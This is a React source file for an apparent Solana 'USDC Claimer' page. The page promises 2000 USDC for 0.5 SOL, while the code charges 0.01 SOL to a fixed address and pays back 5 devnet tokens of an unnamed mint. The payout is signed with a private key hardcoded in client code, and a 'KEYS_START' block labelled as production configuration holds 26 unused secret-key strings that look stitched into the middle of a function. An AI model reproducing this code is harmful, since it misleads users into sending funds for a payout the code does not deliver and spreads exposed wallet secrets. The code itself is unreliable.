/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2zScDmBTBGKqiCsCRh5SKaLLxs8w8DjEwN5tSLtgGkogBg3f13yY9NMD837mC3577vrv8Y2XE3xKTaHMdsaySwUd"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2VXW3EpSFBmDYac9v9NEBoKVRJHJnjnMz8URz2i6PKWJaJ1oWkTPu97iY7Lfr88Z4232pozrtKLEGawZpuBM63b5",
  "key1": "4zpnEubkNtohVB8FsdjEiar5gdSwGkHpNtkGjhQLq3phz3Jesb2rb2dZeTdGBdnybVtYYp6hHZwqhX1vkiXcBwDn",
  "key2": "vDvzw5DFSgj3a6M35gDpEo8zSoFPteuz2gtw3H8Hzp4VfsGLgciE1iNbogEX5h3ZM2sp6RRNHBLiB3SiUWLSvxa",
  "key3": "2p9yuwun2LWTr6psGrxDwNeVGb98cuvDB6Xou6QfFRXPVTJMTwoaTZqmYNhuQKEFSmg2LbTEMaBYuLcnxfEYRLKG",
  "key4": "23SDS5P2ZhMhNpgcu32XZTZsAS3UFKHC7ZoQc5zwgy86nkkojGvfR8A5WJiy1pACQW7j7RHm7efJtHoELdUrGP4p",
  "key5": "65iBhVeWrBde9rtBri5hV6AnidtwqS4ezgxxH1vkxhtvUdouZjhdXserVUrizaq9E51qsS8513suSxWkeqJ9eG8i",
  "key6": "6jobf9u4nDonWvBmgjwRkei2pbhTtxkbEvyqNNDyKdE1JXL8U29ajkR13PuCadoiyEz5ZLq9e7UYajWEkwiweZj",
  "key7": "42D2gHxgJSbr2ewkmf1ZFNKgWcX9zA1dVD7S21TbUukbdwUf7inb7SxYtHe8wbFhTSCKpbHTpuXo999uJt63vK4E",
  "key8": "52Am7dhxDMfKHU1cc9NX7BRm5iGWaTaQYiy6DxxJ5czscE1PgvuMJSkB5K8gPCASLmaYhDNYktUAdjfSXgkVfwsv",
  "key9": "4gLiKm3XG2W9DJJA4MikgNSyrsSUBaF5poEhgiftzthfZXZZ2UuixZoJjWxs34EnYuc3PiWfY1ToZw8oJXeQAwCB",
  "key10": "5QHjtenEUJeqgrV5s8CGNSgABtoqMvQMZ6PZEvw2m9bTbeLZY4QMmQdU6U3xgHDqsrtqJzrtDBxCMKZ1QzRmgoAt",
  "key11": "37JM7utBsXDv7G2ciArMN4568QJUaJbdo56nqKo2cC6t61TThZ2o1mbtmKqVxpbhpojraFbN3LtwY2xBb1XM7gdu",
  "key12": "5eg7fXRTnnx4AKYVWfsxSxrWgwb7fTiqoBcHSV7VTgcyLGPTgw4EdGQtHYCwomjZCDEh3KjKPXNfJ5Mra3oPCesJ",
  "key13": "3geCGD3ngEVA5wbvuMfpCCAth3q5TzfG3dBbS2jExpLAifAN2CNAZYUjtfD1B13EExiwnwuBUu9ZhgaSsbGVXoM7",
  "key14": "5Pa9ThM2sKSJwQ6ftyw81zfJbfcuAmK6YE6rCqXFm7wxQVZy8hJCRL54aEUTetKnEsfDeBBKLHjnzxekDSbUdDye",
  "key15": "5C2jZc3hUZYRkDt9FhN57mZQ66QV3GyGwaJRKYgtMENkAbJ5ZgSVumujLswEbEFU366w1dFPK2ovQPPTmTyeKMM8",
  "key16": "6RrfhcMp9qUJHBK16yWP6NVXpEV6pdLYtwwXYqVdBbDQ3pv9ZVHppDuXhAtYRYAcoqpadSis1mveA9JwXDzcXDM",
  "key17": "2Rv3RphXZeJpEXxNwedVWdXahYQcnGUSTuCiRYCkSfFVPsaGnPwHaAAWfPxjesqxPifCT5V7E292KGVhygX6jPZ5",
  "key18": "3QZrBBN231vwogZ5nNJEXrCthUTjB3YFQcJmSeMvPS1DURdjbuKRR15r2odzVDS4xPqnqQvRXnS8HdNUDai5bP8y",
  "key19": "4j1HtsjwrTJhpPmo2ZZjxgB2Vgtv1aSXyCqyFJFZkX9zhfhnPyGaAkPbDdHM8hyE5A4HsmPR7ELQrVVsgTLiHL4p",
  "key20": "ree73aNQYeVHF2YyqrurGYQchFyNcVvWpnc8hffGMhA5HeBE7befY2Ux22qLZZtX8r8hHkUkgnJVtr5Ao1Fn5aG",
  "key21": "2kVdZKawvbj23WQC7cx6JAEREsRiiS2WD3JvLSq8x1ZJw72NphikWnNi2BrJZ3jtz2J1QkJyCS5jex6mbeWcArQz",
  "key22": "2eLLorQ7LchqZCrZxPiSoygAFUom9SyadrTHmNsUvxej8SF4y6vXAT72ZEL3B6SChQhzTPKQmmSg63aL5N9vHNTB",
  "key23": "5uKEcACM33NbiNor7SDT1D2Hpo3Dt3unhQqFVy82w6hUos57cSvdZVea67Yi4VGioULgBo7N7UvkAakxsq65M4td",
  "key24": "ba1661Ncb4QCVWhfrVHnMeTaWjpkt6GpGH2LVvWuojokho9hFUcYZdAib3VNqhNS98M3yJNGdtze9jvZfDAy185",
  "key25": "opQGFBVQHNRoVvttUHqgqp2YxBF819bTrck6oR8SQ2L1EjtY54RuqKx6x1DKNgKmeNaxWDngiiNj7DwJFtPUvmr"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
